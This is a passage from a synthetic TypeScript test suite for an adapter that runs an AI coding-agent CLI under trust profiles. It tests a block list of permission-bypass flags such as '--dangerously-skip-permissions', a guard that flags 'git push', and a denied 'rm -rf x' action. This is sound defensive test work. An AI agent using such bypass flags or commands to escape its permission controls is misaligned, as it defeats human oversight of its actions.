/**
 * T4.32 (TDD §4.4): the Antigravity module, probe and compile matrix. SYNTHETIC: the executable path is a placeholder and
 * no `agy` binary is run; probe output is the shape the 2026-10-14 live check recorded (`1.3.4`).
 */
import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { afterAll, describe, expect, it } from "vitest";
import { ArtifactStore } from "../../artifacts/index.js";
import { GIT_FINALIZE_COMMIT_EVENT, GitPublisher, publishRefFor } from "../../git/index.js";
import { createIdGenerator } from "../../ids/index.js";
import { createLedger, openLedger } from "../../ledger/index.js";
import { RunLifecycle } from "../../lifecycle/index.js";
import { createSwitchboardServer } from "../../mcp/server.js";
import { resolveTrustProfile } from "../../policy/profiles.js";
import { WorkspaceManager } from "../../workspace/index.js";
import { auditInvocation, bypassClassFlags } from "../audit.js";
import { type ConformanceCase, missingRequiredKinds, runConformanceCase, runConformanceSuite } from "../conformance.js";
import { privilegedProfile, scopeShapes } from "../fixtures/privileged.js";
import { PreflightCache } from "../preflight-cache.js";
import { providerEntry } from "../providers.js";
import { AdapterRegistry } from "../registry.js";
import { createProbeRunner } from "../run.js";
import { guardEvent } from "../tool-guard.js";
import type {
  CompileRequest,
  ExitInfo,
  Invocation,
  NormalizedEvent,
  ParseState,
  ProbeOutput,
  ProbeRunner,
  ResolvedProfile,
  TrustProfile,
} from "../types.js";
import { isIneligible } from "../types.js";
import { ANTIGRAVITY_GIT_CAPABILITIES, ANTIGRAVITY_GIT_WRITE_CONTROL, AntigravityAdapter } from "./adapter.js";
import {
  ANTIGRAVITY_RUNNABLE_KINDS,
  antigravityConformanceCases,
  DEFAULT_SESSION_ID,
  fixturePath,
  PRIVILEGED_BYPASS_PROFILE,
  RESUMED_SESSION_ID,
  replayAdapter,
} from "./fixtures/cases.js";
import { AUTH_STATUS_ARGS, GIT_WRITE_CONTROL_DETAIL, NON_PRIVILEGED_UNSUPPORTED_DETAIL } from "./protocol.js";

const dirs: string[] = [];
const makeCwd = () => {
  const d = mkdtempSync(join(tmpdir(), "sb-antigravity-"));
  dirs.push(d);
  return d;
};
afterAll(() => {
  for (const d of dirs) rmSync(d, { recursive: true, force: true });
});

const EXE = "/opt/synthetic/agy";
const request = (over: Partial<CompileRequest> = {}): CompileRequest => ({
  runId: "run_01M4WBZSXSCWYKTKJN77A7MFJQ",
  objective: "--sandbox fix the failing test",
  constraints: [],
  workspace: { cwd: "/work/tree", writable: true },
  ...over,
});
const adapter = () => new AntigravityAdapter({ executable: EXE });
const PROFILES: TrustProfile[] = ["inspect-untrusted", "edit-untrusted", "test-sandboxed", "trusted-development"];
const profileOf = (name: TrustProfile): ResolvedProfile => resolveTrustProfile(name);
const BYPASS_SCOPE = {
  files: { access: "worktree" },
  shell: { mode: "broad" },
  network: { mode: "on" },
  repository_config: { mode: "enabled" },
  bypass: true,
} as const;
const compiled = (): Invocation => {
  const profile = privilegedProfile(BYPASS_SCOPE);
  const r = adapter().compile(request({ bypassApproved: true }), { ...profile, bypassApproved: true });
  if ("ineligible" in r) throw new Error(r.detail);
  return r;
};

describe("antigravity compile matrix (T4.32)", () => {
  it.each(PROFILES)("%s is Ineligible PROFILE_UNSUPPORTED, with and without a bypass approval", (name) => {
    for (const bypassApproved of [false, true]) {
      const r = adapter().compile(request({ bypassApproved }), { ...profileOf(name), bypassApproved });
      expect(r, name).toMatchObject({ ineligible: true, reason: "PROFILE_UNSUPPORTED" });
    }
  });

  it("privileged compiles only an approved bypass scope with worktree files, shell broad, network on, repo enabled", () => {
    let count = 0;
    for (const scope of scopeShapes()) {
      const profile = privilegedProfile(scope);
      for (const approved of [false, true]) {
        const label = JSON.stringify({ scope, approved });
        const r = adapter().compile(request({ bypassApproved: approved }), { ...profile, bypassApproved: approved });
        const expectOk =
          approved &&
          scope.bypass &&
          scope.files.access === "worktree" &&
          scope.shell.mode === "broad" &&
          scope.network.mode === "on" &&
          scope.repository_config.mode === "enabled";
        if (!expectOk) {
          expect(r, label).toMatchObject({ ineligible: true });
          // A privileged scope without bypass is refused for the settings-only toolPermission (TDD §4.4.2).
          if (!scope.bypass) expect(r, label).toMatchObject({ reason: "PROFILE_UNSUPPORTED" });
          continue;
        }
        count += 1;
        expect("ineligible" in r, label).toBe(false);
        if ("ineligible" in r) continue;
        expect(r.policyFlags, label).toEqual(["--dangerously-skip-permissions"]);
        expect(auditInvocation(r), label).toEqual(["--dangerously-skip-permissions"]);
        expect(auditInvocation(r, { profile, bypassApproved: false }), label).toEqual([
          "--dangerously-skip-permissions",
        ]);
        expect(auditInvocation(r, { profile, bypassApproved: true }), label).toEqual([]);
      }
    }
    expect(count).toBe(1);
  });

  it("a read-only workspace keeps the bypass cell Ineligible", () => {
    const profile = { ...privilegedProfile(BYPASS_SCOPE), bypassApproved: true };
    const r = adapter().compile(request({ bypassApproved: true, workspace: { cwd: "/w", writable: false } }), profile);
    expect(r).toMatchObject({ ineligible: true, reason: "CAPABILITY_MISSING" });
  });

  it("keeps the prompt in one `--prompt=` word and never emits a flag the TDD §4.4 rules exclude", () => {
    const r = compiled();
    expect(r.argv).toEqual([
      EXE,
      "--prompt=--sandbox fix the failing test",
      "--output-format",
      "stream-json",
      "--dangerously-skip-permissions",
    ]);
    const never = [
      "-p",
      "--sandbox",
      "--mode",
      "--model",
      "--effort",
      "--agent",
      "-c",
      "--continue",
      "--print-timeout",
      "--remote-control",
      "--gemini_dir",
      "--add-dir",
      "--project",
      "--new-project",
      "--input-format",
    ];
    for (const a of r.argv.slice(1)) expect(never.includes(a), a).toBe(false);
    expect(r.env).toEqual({ AGY_CLI_DISABLE_AUTO_UPDATE: "true" });
    expect(r.envAllowlist).toEqual(["PATH", "HOME"]);
    for (const name of ["GEMINI_API_KEY", "GOOGLE_API_KEY", "GOOGLE_GEMINI_BASE_URL"]) {
      expect(r.envAllowlist).not.toContain(name);
    }
    expect(r.stdin).toEqual({ kind: "none" });
    expect(r.transport).toBe("subprocess-jsonl");
    expect(r.outputFormat).toBe("jsonl");
  });

  it("a requested model, an unapproved bypass and a missing binary are Ineligible with a reason", () => {
    const profile = privilegedProfile(BYPASS_SCOPE);
    const approved = { ...profile, bypassApproved: true };
    expect(adapter().compile(request({ model: "x", bypassApproved: true }), approved)).toMatchObject({
      reason: "CAPABILITY_MISSING",
    });
    expect(adapter().compile(request(), profile)).toMatchObject({ reason: "PROFILE_UNSUPPORTED" });
    const none = new AntigravityAdapter({ pathEnv: "/nonexistent" });
    expect(none.compile(request({ bypassApproved: true }), approved)).toMatchObject({
      reason: "CAPABILITY_MISSING",
      detail: expect.stringContaining("agy not found on PATH"),
    });
  });
});

describe("antigravity bypass-class declarations (ADR-0035, ADR-0045)", () => {
  const DECLARED = [
    "-dangerously-skip-permissions",
    "--remote-control",
    "-remote-control",
    "--gemini_dir",
    "-gemini_dir",
    "--add-dir",
    "-add-dir",
  ];

  it("are active now that the entry has an adapter", () => {
    for (const f of [...DECLARED, "--dangerously-skip-permissions"]) expect(bypassClassFlags()).toContain(f);
  });

  it("each spelling, bare or with a value, is refused outside the approved bypass case and admitted inside it", () => {
    const base = compiled();
    const scoped = privilegedProfile(BYPASS_SCOPE);
    for (const word of [...DECLARED, "-dangerously-skip-permissions=true", "-gemini_dir=/tmp/x"]) {
      const inv = { ...base, argv: [...base.argv, word] };
      const hits = auditInvocation(inv).filter((h) => h !== "--dangerously-skip-permissions");
      expect(hits, word).toHaveLength(1);
      expect(auditInvocation(inv, { profile: profileOf("trusted-development"), bypassApproved: true }), word).toContain(
        hits[0],
      );
      expect(auditInvocation(inv, { profile: scoped, bypassApproved: true }), word).toEqual([]);
    }
  });
});

describe("antigravity probe (T4.32)", () => {
  const runner =
    (table: Record<string, { stdout: string; exitCode: number }>): ProbeRunner =>
    async (argv) => {
      const key = argv.slice(1).join(" ");
      const hit = table[key] ?? { stdout: "", exitCode: 2 };
      return { stdout: hit.stdout, stderr: "", exitCode: hit.exitCode, timedOut: false } as ProbeOutput;
    };
  const HELP =
    "Usage of agy:\n  -c, --continue\n  --conversation string\n  --dangerously-skip-permissions\n" +
    "  --output-format string\n  -p, --print, --prompt string\n  --sandbox\n";

  it("passes the five steps on the live-check shapes and reports the version line", async () => {
    const r = await adapter().probe(
      runner({ "--version": { stdout: "1.3.4\n", exitCode: 0 }, "--help": { stdout: HELP, exitCode: 0 } }),
    );
    expect(r.binaryVersion).toBe("1.3.4");
    expect(r.steps.map((s) => [s.step, s.ok])).toEqual([
      ["binary", true],
      ["version", true],
      ["command", true],
      ["output_format", true],
      ["flags", true],
    ]);
  });

  it("names a missing flag, an unparseable version and a missing binary", async () => {
    const noConversation = await adapter().probe(
      runner({
        "--version": { stdout: "1.3.4\n", exitCode: 0 },
        "--help": { stdout: HELP.replace("--conversation", "--talk"), exitCode: 0 },
      }),
    );
    expect(noConversation.steps.find((s) => s.step === "flags")).toMatchObject({
      ok: false,
      detail: "missing --conversation",
    });
    const noVersion = await adapter().probe(runner({ "--version": { stdout: "agy\n", exitCode: 0 } }));
    expect(noVersion.binaryVersion).toBeNull();
    const missing = await new AntigravityAdapter({ pathEnv: "/nonexistent" }).probe(runner({}));
    expect(missing.steps).toEqual([{ step: "binary", ok: false, detail: "agy not found on PATH" }]);
  });

  it("reads no Antigravity credential, settings or state file (source inspection)", () => {
    for (const f of ["adapter.ts", "protocol.ts"]) {
      const src = readFileSync(new URL(`./${f}`, import.meta.url), "utf8");
      expect(src, f).not.toMatch(/from "node:fs"|readFile|antigravity-oauth-token|settings\.json"/);
    }
  });
});

describe("antigravity auth preflight (T4.34; SYNTHETIC outputs in the shapes of the 2026-10-14 live check C3b, C3c)", () => {
  const out =
    (stdout: string, exitCode: number | null = 0, extra: Partial<ProbeOutput> = {}): ProbeRunner =>
    async () => ({ stdout, stderr: "", exitCode, timedOut: false, ...extra });
  const MODELS = "m-flash\tModel Flash\nm-pro\tModel Pro\n";
  const SIGN_IN = "Error: Please sign in to view available models. Launch the CLI without arguments to sign in.\n";

  it("runs only `models` with a short timeout; model lines at exit 0 are OK", async () => {
    const seen: Array<{ argv: readonly string[]; timeoutMs?: number }> = [];
    const r = await adapter().authPreflight(async (argv, opts) => {
      seen.push({ argv, ...(opts?.timeoutMs ? { timeoutMs: opts.timeoutMs } : {}) });
      return { stdout: MODELS, stderr: "Fetching available models...\n", exitCode: 0, timedOut: false };
    });
    expect(r).toEqual({ state: "OK" });
    expect(seen).toHaveLength(1);
    expect(seen[0]?.argv).toEqual([EXE, "models"]);
    expect(seen[0]?.timeoutMs).toBeLessThanOrEqual(10_000);
  });

  it("the sign-in error at exit 1 is AUTH_REQUIRED naming the native login", async () => {
    expect(await adapter().authPreflight(out("", 1, { stderr: SIGN_IN }))).toEqual({
      state: "AUTH_REQUIRED",
      loginCommand: "agy",
    });
  });

  it("any other output, exit code, timeout or spawn failure is UNKNOWN and leaks no more than one stderr line", async () => {
    const cases: Array<[string, ProbeRunner]> = [
      ["empty stdout at exit 0", out("")],
      ["a non-model line at exit 0", out(`${MODELS}You are not signed in\n`)],
      ["a line with no tab", out("m-flash Model Flash\n")],
      ["model lines at a non-zero exit", out(MODELS, 1)],
      ["sign-in text at exit 0", out("", 0, { stderr: SIGN_IN })],
      ["sign-in text at exit 2", out("", 2, { stderr: SIGN_IN })],
      ["an unknown error at exit 1", out("", 1, { stderr: "Error: flags provided but not defined\n" })],
      ["a null exit code", out(MODELS, null)],
      ["timeout", out("", null, { timedOut: true })],
      ["spawn error", out("", null, { spawnError: "ENOENT" })],
    ];
    for (const [name, runner] of cases) {
      expect(await adapter().authPreflight(runner), name).toMatchObject({ state: "UNKNOWN" });
    }
    const r = await adapter().authPreflight(
      out(MODELS, 1, { stderr: `Error: odd\u0007 ${"x".repeat(200)}\nsecret: hunter2\n` }),
    );
    expect(r.state).toBe("UNKNOWN");
    if (r.state === "UNKNOWN") {
      expect(r.reason.length).toBeLessThan(200);
      expect(r.reason).not.toContain("hunter2");
      expect(r.reason).not.toContain("\u0007");
      expect(r.reason).not.toContain("Model Flash");
    }
  });

  it("is UNKNOWN when the binary is not on PATH, without running anything", async () => {
    let ran = false;
    const r = await new AntigravityAdapter({ pathEnv: "/nonexistent" }).authPreflight(async () => {
      ran = true;
      return { stdout: MODELS, stderr: "", exitCode: 0, timedOut: false };
    });
    expect(r).toMatchObject({ state: "UNKNOWN" });
    expect(ran).toBe(false);
  });

  it("the T3.21 preflight cache keeps an OK and re-runs `models` after AUTH_REQUIRED or UNKNOWN", async () => {
    const HELP =
      "Usage of agy:\n  --conversation string\n  --dangerously-skip-permissions\n" +
      "  --output-format string\n  -p, --print, --prompt string\n";
    let models: ProbeOutput = { stdout: MODELS, stderr: "", exitCode: 0, timedOut: false };
    let modelCalls = 0;
    const runner: ProbeRunner = async (argv) => {
      const key = argv.slice(1).join(" ");
      if (key === "--version") return { stdout: "1.3.4\n", stderr: "", exitCode: 0, timedOut: false };
      if (key === "--help") return { stdout: HELP, stderr: "", exitCode: 0, timedOut: false };
      modelCalls += 1;
      return models;
    };
    const identity = { path: EXE, mtimeMs: 1, size: 1, ino: 1 };
    const fresh = () => new PreflightCache({ ttlMs: 60_000, now: () => 0, identify: () => identity });
    const a = adapter();

    const ok = fresh();
    expect((await ok.probe(a, runner)).steps.every((s) => s.ok)).toBe(true);
    expect(await ok.authPreflight(a, runner)).toEqual({ state: "OK" });
    expect(await ok.authPreflight(a, runner)).toEqual({ state: "OK" });
    expect(modelCalls).toBe(1);

    for (const failing of [
      { stdout: "", stderr: SIGN_IN, exitCode: 1, timedOut: false },
      { stdout: "", stderr: "", exitCode: null, timedOut: true },
    ]) {
      models = failing;
      modelCalls = 0;
      const cache = fresh();
      await cache.probe(a, runner);
      expect((await cache.authPreflight(a, runner)).state).not.toBe("OK");
      expect((await cache.authPreflight(a, runner)).state).not.toBe("OK");
      expect(modelCalls).toBe(2);
    }
  });
});

describe("antigravity registry entry and manifest gate (T4.32)", () => {
  it("is in the provider table with an adapter and declares resumeCwd like the adapter", () => {
    const entry = providerEntry("antigravity");
    expect(entry?.create).toBeDefined();
    expect(entry?.resumeCwd).toBe(adapter().resumeCwd);
    expect(entry?.create?.({}).id).toBe("antigravity");
  });

  it("fails the version gate for any version until `adapters validate` passes one (ADR-0009)", () => {
    const registry = new AdapterRegistry();
    for (const v of ["1.3.4", "1.3.1", "0.0.0", null]) {
      expect(registry.gate("antigravity", v).eligible, String(v)).toBe(false);
    }
  });
});

/**
 * T4.33: parser, result and failure classification. SYNTHETIC lines in the shapes the 2026-10-14 live check recorded
 * (rows C4, C7, C9, C10); ids, text and numbers are invented.
 */
describe("antigravity parser and result (T4.33)", () => {
  const CID = "0b6c2d1e-0000-4000-8000-00000000000a";
  const j = (o: Record<string, unknown>) => JSON.stringify(o);
  const INIT = j({
    event: "init",
    conversation_id: CID,
    init: { cwd: "/work/tree", tools: ["run_command"], permission_mode: "always-proceed", model: "synthetic-model" },
  });
  const STEP = (o: Record<string, unknown>) => j({ event: "step_update", conversation_id: CID, ...o });
  const USAGE = { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 };
  const RESULT = (over: Record<string, unknown> = {}) =>
    j({
      event: "result",
      result: {
        conversation_id: CID,
        status: "SUCCESS",
        response: "ok",
        duration_seconds: 3,
        num_turns: 1,
        usage: USAGE,
        ...over,
      },
    });
  const EXIT0: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
  const parse = (lines: string[]) => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    const events: NormalizedEvent[] = lines.flatMap((l) => a.parseEvent(l, state));
    return { a, state, events };
  };

  it("success: conversation id and model from init, response as the summary, run-total usage provider_reported", () => {
    const { a, state, events } = parse([
      INIT,
      STEP({ step_index: 0, state: "DONE", step_type: "user_input" }),
      STEP({ step_index: 1, state: "ACTIVE", step_type: "agent_response", text_delta: "o", usage: USAGE }),
      STEP({ step_index: 1, state: "DONE", step_type: "agent_response", text_delta: "k" }),
      RESULT(),
    ]);
    expect(events).toEqual([
      { kind: "session_bound", nativeSessionId: CID, model: "synthetic-model" },
      { kind: "usage", source: "provider_reported", metrics: USAGE },
      { kind: "message", role: "assistant", text: "ok" },
      { kind: "result", ok: true },
    ]);
    expect(events.find((e) => e.kind === "session_bound")).not.toHaveProperty("backingProvider");
    expect(state).toMatchObject({ nativeSessionId: CID, unknownEvents: 0 });
    expect(a.extractResult(events, EXIT0)).toEqual({
      ok: true,
      nativeSessionId: CID,
      summary: "ok",
      unknownEventCount: 0,
    });
  });

  it("a soft-denied tool is PERMISSION_BLOCKED although status is SUCCESS and the exit is 0 (live check C7)", () => {
    const { a, events } = parse([
      INIT,
      STEP({
        step_index: 2,
        state: "ACTIVE",
        step_type: "tool",
        tool_name: "run_command",
        tool_info: { name: "run_command", parameters: { command: "echo hello" } },
      }),
      STEP({ step_index: 2, state: "DONE", step_type: "tool", tool_name: "run_command" }),
      RESULT({ response: "", denied_actions: [{ action: "command", display_name: "RunCommand" }] }),
    ]);
    expect(events.filter((e) => e.kind === "tool_call")).toEqual([
      { kind: "tool_call", tool: "shell", name: "run_command", command: "echo hello" },
    ]);
    expect(events).toContainEqual({ kind: "permission_denied", tool: "RunCommand" });
    expect(a.extractResult(events, EXIT0)).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });

  it("SUCCESS with no reported tokens (a print timeout, C10) and every other status fail", () => {
    const timeout = parse([INIT, RESULT({ response: "", usage: { ...USAGE, total_tokens: 0 } })]);
    expect(timeout.a.extractResult(timeout.events, EXIT0)).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    const noUsage = parse([INIT, RESULT({ usage: undefined })]);
    expect(noUsage.a.extractResult(noUsage.events, EXIT0)).toMatchObject({ ok: false });
    for (const status of ["ERROR", "CANCELED", "INTERRUPTED", "INVALID", "WAITING", "RUNNING", "NEW_STATUS"]) {
      const r = parse([INIT, RESULT({ status })]);
      expect(r.a.extractResult(r.events, EXIT0), status).toMatchObject({ ok: false });
    }
  });

  it("the envelope error maps an invalid model and a failed login; other errors are TOOL_FAILURE", () => {
    const cases: [string, string][] = [
      ["invalid model selection (--model x): Available models: a, b", "MODEL_UNAVAILABLE"],
      ["authentication failed or timed out", "AUTH_REQUIRED"],
      ["something else", "TOOL_FAILURE"],
    ];
    for (const [error, code] of cases) {
      const r = parse([j({ event: "result", result: { conversation_id: "", status: "ERROR", response: "", error } })]);
      expect(r.a.extractResult(r.events, { ...EXIT0, exitCode: 1 }), error).toMatchObject({
        ok: false,
        failureCode: code,
      });
    }
  });

  it("a non-zero exit, a missing result, a timeout and a cancel never succeed", () => {
    const { a, events } = parse([INIT, RESULT()]);
    expect(a.extractResult(events, { ...EXIT0, exitCode: 3 })).toMatchObject({
      ok: false,
      failureCode: "TOOL_FAILURE",
    });
    expect(a.extractResult(events, { ...EXIT0, outcome: "timeout", timeoutKind: "idle" })).toMatchObject({
      failureCode: "PROCESS_TIMEOUT",
    });
    expect(a.extractResult(events, { ...EXIT0, outcome: "cancelled" })).toMatchObject({ failureCode: "CANCELLED" });
    const cut = parse([INIT, STEP({ step_index: 1, state: "ACTIVE", step_type: "agent_response", text_delta: "x" })]);
    expect(cut.a.extractResult(cut.events, EXIT0)).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
  });

  it("malformed and unknown lines are unknown events, counted, never a result; JSON framing errors emit nothing", () => {
    const { a, state, events } = parse([
      INIT,
      j({ event: "brand_new" }),
      j({ type: "init" }),
      j({ event: "init", conversation_id: CID }),
      j({ event: "step_update", state: "ACTIVE" }),
      j({ event: "result", result: {} }),
      "not json",
    ]);
    expect(events.filter((e) => e.kind === "unknown")).toHaveLength(5);
    expect(state.unknownEvents).toBe(5);
    expect(events.some((e) => e.kind === "result")).toBe(false);
    expect(a.extractResult(events, EXIT0)).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
  });

  it("the conversation id comes only from structured fields; the first one stays bound and a change fails", () => {
    const other = "0b6c2d1e-0000-4000-8000-00000000000b";
    const { a, state, events } = parse([INIT, RESULT({ conversation_id: other, response: `id ${other}` })]);
    expect(state.nativeSessionId).toBe(CID);
    expect(events.filter((e) => e.kind === "session_bound")).toHaveLength(1);
    expect(a.extractResult(events, EXIT0)).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      nativeSessionId: CID,
    });
    // A second `init` for another conversation is the same anomaly.
    const twice = parse([INIT, j({ event: "init", conversation_id: other, init: {} }), RESULT()]);
    expect(twice.a.extractResult(twice.events, EXIT0)).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
    });
    // Repeating the same id (init then result, as recorded) is not an anomaly; an id only in text binds nothing.
    const same = parse([INIT, RESULT()]);
    expect(same.a.extractResult(same.events, EXIT0)).toMatchObject({ ok: true });
    const textOnly = parse([RESULT({ conversation_id: "", response: `conversation_id ${other}` })]);
    expect(textOnly.state.nativeSessionId).toBeUndefined();
  });
});

/**
 * T4.33 hardening toward the T4.23 Done-when (denied tools, malformed lines, resume). SYNTHETIC: shapes the live check
 * did not record are invented to pin a fail-closed reading, never to claim the CLI emits them.
 */
describe("antigravity parser hardening (T4.33, synthetic shapes)", () => {
  const CID = "0b6c2d1e-0000-4000-8000-00000000000c";
  const j = (o: Record<string, unknown>) => JSON.stringify(o);
  const INIT = j({
    event: "init",
    conversation_id: CID,
    init: { cwd: "/work/tree", permission_mode: "always-proceed" },
  });
  const USAGE = { input_tokens: 20, output_tokens: 3, thinking_tokens: 1, cache_read_tokens: 0, total_tokens: 24 };
  const RESULT = (over: Record<string, unknown> = {}) =>
    j({ event: "result", result: { conversation_id: CID, status: "SUCCESS", response: "ok", usage: USAGE, ...over } });
  const TOOL = (index: number, state: string, info?: Record<string, unknown>) =>
    j({
      event: "step_update",
      conversation_id: CID,
      step_index: index,
      state,
      step_type: "tool",
      tool_name: "run_command",
      ...(info ? { tool_info: info } : {}),
    });
  const EXIT0: ExitInfo = { outcome: "exited", exitCode: 0, signal: null, expectedExitCodes: [0] };
  const parse = (lines: string[]) => {
    const a = adapter();
    const state: ParseState = { lines: 0, unknownEvents: 0 };
    const events: NormalizedEvent[] = lines.flatMap((l) => a.parseEvent(l, state));
    return { a, state, events, result: a.extractResult(events, EXIT0) };
  };

  it("several denied tools are each reported and the run is PERMISSION_BLOCKED", () => {
    const { events, result } = parse([
      INIT,
      RESULT({
        denied_actions: [
          { action: "command", display_name: "RunCommand" },
          { action: "write" },
          "not an object",
          { display_name: "x".repeat(200) },
        ],
      }),
    ]);
    expect(events.filter((e) => e.kind === "permission_denied")).toEqual([
      { kind: "permission_denied", tool: "RunCommand" },
      { kind: "permission_denied", tool: "write" },
      { kind: "permission_denied", tool: "unknown" },
      { kind: "permission_denied", tool: `${"x".repeat(64)}…` },
    ]);
    expect(result).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });

  it("a denied_actions value that is not an array is read as a denial, never ignored; empty and null are none", () => {
    for (const denied of [{ action: "command" }, "command", 1, true]) {
      const r = parse([INIT, RESULT({ denied_actions: denied })]);
      expect(r.result, JSON.stringify(denied)).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
    }
    for (const denied of [[], null]) {
      const r = parse([INIT, RESULT({ denied_actions: denied })]);
      expect(r.result, JSON.stringify(denied)).toMatchObject({ ok: true });
    }
  });

  it("a non-string error is an unknown provider error; an empty error string is none", () => {
    for (const error of [{ code: 429 }, ["x"], 1, false]) {
      const r = parse([INIT, RESULT({ error })]);
      expect(r.result, JSON.stringify(error)).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
    }
    expect(parse([INIT, RESULT({ error: "" })]).result).toMatchObject({ ok: true });
    expect(parse([INIT, RESULT({ error: null })]).result).toMatchObject({ ok: true });
  });

  it("an unrecorded rate-limit or quota text in error is TOOL_FAILURE, never RATE_LIMIT_TRANSIENT or success", () => {
    for (const error of ["RESOURCE_EXHAUSTED: quota exceeded", "429 Too Many Requests", "rate limit reached"]) {
      const r = parse([INIT, RESULT({ status: "ERROR", response: "", error })]);
      expect(r.result, error).toMatchObject({ ok: false, failureCode: "TOOL_FAILURE" });
      expect(
        r.events.some((e) => e.kind === "rate_limit"),
        error,
      ).toBe(false);
    }
  });

  it("a tool call after the result line is not a success (fail closed); a guard verdict on it keeps its own code", () => {
    const trailing = parse([INIT, RESULT(), TOOL(3, "ACTIVE", { name: "run_command", parameters: { command: "ls" } })]);
    expect(trailing.result).toMatchObject({
      ok: false,
      failureCode: "OUTPUT_PROTOCOL_ERROR",
      failureDetail: "tool call after the result line",
      nativeSessionId: CID,
    });
    // A tool step with no recorded parameters is still a tool call after the result.
    expect(parse([INIT, RESULT(), TOOL(3, "ACTIVE")]).result).toMatchObject({
      ok: false,
      failureDetail: "tool call after the result line",
    });
    // Non-tool steps after the result are dropped by the parser, so they are not trailing tool calls.
    const textAfter = parse([INIT, RESULT(), j({ event: "step_update", step_index: 4, step_type: "checkpoint" })]);
    expect(textAfter.result).toMatchObject({ ok: true });
    // The same call before the result is clean.
    expect(parse([INIT, TOOL(3, "ACTIVE", { name: "run_command" }), RESULT()]).result).toMatchObject({ ok: true });
    // A guard verdict on the trailing call keeps its own code (ADR-0039), not the trailing-tool protocol error.
    const ctx = { cwd: "/work/tree", home: "/home/synthetic", bypass: true };
    const flagged = parse([
      INIT,
      RESULT(),
      TOOL(3, "ACTIVE", { name: "run_command", parameters: { command: "git push origin main" } }),
    ]);
    expect(
      flagged.a.extractResult(
        flagged.events.map((e) => guardEvent(e, ctx)),
        EXIT0,
      ),
    ).toMatchObject({ ok: false, failureCode: "PERMISSION_BLOCKED" });
  });

  it("a second result line fails the run even when it reports SUCCESS", () => {
    const failedThenOk = parse([INIT, RESULT({ status: "ERROR" }), RESULT()]);
    expect(failedThenOk.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
    const okTwice = parse([INIT, RESULT(), RESULT()]);
    expect(okTwice.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
    expect(okTwice.events.filter((e) => e.kind === "result").map((e) => e.kind === "result" && e.ok)).toEqual([
      true,
      false,
    ]);
  });

  it("a second result line records no second usage row, so the run total is never counted twice (FR-CAP-01)", () => {
    const { events } = parse([INIT, RESULT(), RESULT({ usage: { ...USAGE, total_tokens: 99 } })]);
    expect(events.filter((e) => e.kind === "usage")).toEqual([
      { kind: "usage", source: "provider_reported", metrics: USAGE },
    ]);
  });

  it("a step for another conversation fails the run, keeps the first id bound and still reaches the guard", () => {
    const other = "0b6c2d1e-0000-4000-8000-00000000000d";
    const step = (cid: string, o: Record<string, unknown>) =>
      j({ event: "step_update", conversation_id: cid, step_index: 2, state: "DONE", ...o });
    const text = parse([INIT, step(other, { step_type: "agent_response", text_delta: "x" }), RESULT()]);
    expect(text.state.nativeSessionId).toBe(CID);
    expect(text.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR", nativeSessionId: CID });
    const tool = parse([
      INIT,
      step(other, { step_type: "tool", tool_name: "run_command", tool_info: { parameters: { command: "ls" } } }),
      RESULT(),
    ]);
    expect(tool.events).toContainEqual({ kind: "tool_call", tool: "shell", name: "run_command", command: "ls" });
    expect(tool.result).toMatchObject({ ok: false, failureCode: "OUTPUT_PROTOCOL_ERROR" });
    // The same id, an empty or absent id, and a step before any binding are not anomalies; a step never binds.
    const same = parse([INIT, step(CID, { step_type: "agent_response" }), RESULT()]);
    expect(same.result).toMatchObject({ ok: true });
    const absent = parse([INIT, j({ event: "step_update", step_index: 2, step_type: "agent_response" }), RESULT()]);
    expect(absent.result).toMatchObject({ ok: true });
    const early = parse([step(other, { step_type: "agent_response" })]);
    expect(early.state.nativeSessionId).toBeUndefined();
    expect(early.events).toEqual([]);
  });

  it("supervisor outcomes win over a denial, a denial over an envelope error, and the guard over both", () => {
    const denied = RESULT({ denied_actions: [{ action: "run_command", display_name: "rm -rf x" }], error: "boom" });
    const { a, events } = parse([INIT, denied]);
    expect(a.extractResult(events, { ...EXIT0, outcome: "cancelled" })).toMatchObject({ failureCode: "CANCELLED" });
    expect(a.extractResult(events, { ...EXIT0, outcome: "timeout", timeoutKind: "wall_clock" })).toMatchObject({
      failureCode: "PROCESS_TIMEOUT",
    });
    expect(a.extractResult(events, { ...EXIT0, exitCode: 3 })).toMatchObject({ failureCode: "PERMISSION_BLOCKED" });
    expect(a.extractResult(events, EXIT0)).toMatchObject({ failureCode: "PERMISSION_BLOCKED" });
    const authThenProtocol = parse([INIT, RESULT({ status: "ERROR", error: "authentication failed: x" }), RESULT()]);
    expect(authThenProtocol.result).toMatchObject({ ok: false, failureCode: "AUTH_REQUIRED" });
    const guarded: NormalizedEvent[] = [
      {
        kind: "tool_call",
        tool: "shell",
        name: "run_command",
        command: "git push",
        violation: { kind: "git_write", reason: "git push" },
      },
      ...events,
    ];
    expect(a.extractResult(guarded, EXIT0)).toMatchObject({ failureCode: "PERMISSION_BLOCKED" });
    expect(a.extractResult(guarded, EXIT0).failureDetail).toMatch(/^git write attempted/);
  });

  it("negative and non-number usage values are dropped; zero total is not a success", () => {
    const r = parse([
      INIT,
      RESULT({ usage: { input_tokens: -5, output_tokens: "3", thinking_tokens: null, total_tokens: 24, extra: 9 } }),
    ]);
    expect(r.events.find((e) => e.kind === "usage")).toEqual({
      kind: "usage",
